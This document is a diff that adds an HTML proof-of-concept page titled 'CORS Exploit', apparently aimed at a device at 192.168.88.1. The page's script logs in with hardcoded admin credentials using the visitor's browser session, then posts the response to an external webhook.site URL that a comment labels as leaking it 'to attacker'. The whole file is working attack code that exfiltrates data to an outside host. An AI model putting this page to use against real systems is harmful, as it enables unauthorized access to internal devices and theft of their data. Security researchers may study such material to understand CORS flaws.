@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <head><title>CORS Exploit</title></head>
+  <body>
+    <h2>⚠️ Exploiting CORS on 192.168.88.1</h2>
+    <script>
+      fetch("http://192.168.88.1/login", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "email=admin%40vi.com&password=admin"
+      })
+      .then(res => res.text())
+      .then(data => {
+        // Leak response to attacker
+        fetch("https://webhook.site/5f6932a3-ff28-412d-8254-bb75bab189c2", {
+          method: "POST",
+          body: data,
+          mode: "no-cors"
+        });
+      })
+      .catch(err => console.error("Exploit failed:", err));
+    </script>
+  </body>
+</html>
